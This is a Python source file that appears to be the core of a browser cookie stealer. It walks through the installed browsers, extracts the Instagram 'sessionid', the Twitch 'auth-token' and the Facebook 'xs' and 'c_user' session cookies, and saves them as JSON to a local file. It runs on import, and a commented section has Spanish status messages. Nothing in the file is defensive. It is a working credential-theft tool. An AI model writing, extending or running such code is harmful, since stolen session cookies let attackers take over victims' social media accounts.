import validateExplorers as vb
import instagram
import facebook
import twitch
import json


def execute():
    cookies_data = []

    for browser in vb.validateBrowsers():

        # INSTAGRAM
        insta_cookie = instagram.find_cookie_instagram(browser)
        if insta_cookie is not None:
            cookie = {
                "page": "Instagram",
                "name": "sessionid",
                "browser": browser,
                "value": str(insta_cookie)
            }
            cookies_data.append(cookie)

        # TWITCH
        twitch_cookie = twitch.find_cookie_twitch(browser)
        if twitch_cookie is not None:
            cookie = {
                "page": "Twitch",
                "name": "auth-token",
                "browser": browser,
                "value": str(twitch_cookie)
            }
            cookies_data.append(cookie)

        # FACEBOOK
        facebook_cookies = facebook.find_cookie_facebook(browser)
        if facebook_cookies is not None:
            for facebook_cookie in facebook_cookies:
                if facebook_cookie[0] == "xs" or facebook_cookie[0] == "c_user":
                    cookie = {
                        "page": "Facebook",
                        "name": facebook_cookie[0],
                        "browser": browser,
                        "value": str(facebook_cookie[1])
                    }
                cookies_data.append(cookie)

    cookies_json = json.dumps(cookies_data)

    with open("cookies.txt", "w") as file:
        file.write(cookies_json)


execute()

# instagram_cookie = find_operagx_cookie_instagram()
# if instagram_cookie:
#   print(f"[Cookie encontrada] Instagram")
# else:
#    print("[ERROR] No se encontró la cookie de Instagram en ningún navegador.")
